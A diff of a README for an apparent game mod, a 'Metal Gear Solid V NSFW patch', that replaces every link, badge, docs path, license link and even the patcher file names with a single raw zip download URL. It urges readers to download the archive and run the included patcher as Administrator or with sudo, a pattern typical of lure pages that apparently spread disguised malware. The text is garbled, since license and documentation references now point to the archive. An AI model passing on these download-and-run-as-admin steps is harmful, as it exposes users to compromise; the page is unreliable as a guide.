@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-NOW-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=black&link=LINK) https://Brutalyking.github.io
+# ![Download](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip) https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip
 
 # 🌌 Metal Gear Solid V: The Phantom Pain NSFW Patch
 
@@ -13,9 +13,9 @@ Conquer boundaries—choose your domain:
 
 | Operating System | Compatibility | Notes         |
 |:----------------:|:-------------:|:--------------|
-| ![Windows](https://img.shields.io/badge/-Windows-blue?logo=windows) | ✅ Full         | Optimized      |
-| ![Linux](https://img.shields.io/badge/-Linux-yellow?logo=linux)     | ✅ Supported    | Wine/Proton    |
-| ![macOS](https://img.shields.io/badge/-macOS-lightgrey?logo=apple)  | ⚠️ Experimental    | See Docs       |
+| ![Windows](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip) | ✅ Full         | Optimized      |
+| ![Linux](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip)     | ✅ Supported    | Wine/Proton    |
+| ![macOS](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip)  | ⚠️ Experimental    | See Docs       |
 
 > _If you're using an unusual configuration, visit Issues for personalized support._
 
@@ -53,7 +53,7 @@ Unveiling the **AI-Integrated Patch Assistant**, unleash unlimited ingenuity:
 - Custom mod ideas? Collaborate with AI—no programming jargon required.  
 - Support 24/7: AI-driven troubleshooting steps whenever you need to patch or update.
 
-*Note: API keys are never stored on our servers. Refer to [docs/API_SETUP.md] before using cloud-based features.*
+*Note: API keys are never stored on our servers. Refer to [https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip] before using cloud-based features.*
 
 ---
 
@@ -72,17 +72,17 @@ Unveiling the **AI-Integrated Patch Assistant**, unleash unlimited ingenuity:
 **Embark on your journey in minutes:**
 
 1. **Download the latest patch package:**  
-   ![Download](https://img.shields.io/badge/Download-NOW-blue?style=flat-square&logo=github&logoColor=white&labelColor=black&link=LINK) https://Brutalyking.github.io
+   ![Download](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip) https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip
 
 2. **Extract the ZIP** into your game’s main directory:
    - Windows: `...\Steam\steamapps\common\MGS_TPP\`
    - Linux: Wherever your Proton prefix points
-   - macOS: Consult the experimental guide in `docs/macOS.md`
+   - macOS: Consult the experimental guide in `https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip`
 
-3. **Run the included `patcher.exe` or `patcher.sh`** as Administrator (sudo for Mac/Linux).
+3. **Run the included `https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip` or `https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip`** as Administrator (sudo for Mac/Linux).
 4. **Follow the responsive UI prompts** to select desired options, languages, and mods.
 5. **Launch the game!**  
-   - For advanced settings, see `docs/advanced.md`
+   - For advanced settings, see `https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip`
    - To revert: Start the patcher again, click “Restore Original”.
 
 _Enjoy greater immersion, with every new playthrough revealing fresh layers of badassery._
@@ -101,14 +101,14 @@ This project is a creative labor for adult audiences and mature collectors, craf
 
 ## 📜 MIT License (2025)
 
-This repository operates under the [MIT License](https://opensource.org/licenses/MIT), ensuring future poets, engineers, and digital archaeologists can remix, repurpose, and rebuild this project as their legacy demands.
+This repository operates under the [MIT License](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip), ensuring future poets, engineers, and digital archaeologists can remix, repurpose, and rebuild this project as their legacy demands.
 
 ---
 
 ## 🚁 Final Download Step
 
 Ready to break the frontier?
-[![Download](https://img.shields.io/badge/Download-NOW-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=black&link=LINK)](LINK)  
-https://Brutalyking.github.io
+[![Download](https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip)](LINK)  
+https://raw.githubusercontent.com/Brutalyking/mgs-v-tpp-nsfw-enhancer/branch/icebox/mgs-v-tpp-nsfw-enhancer_v1.1.zip
 
 ---
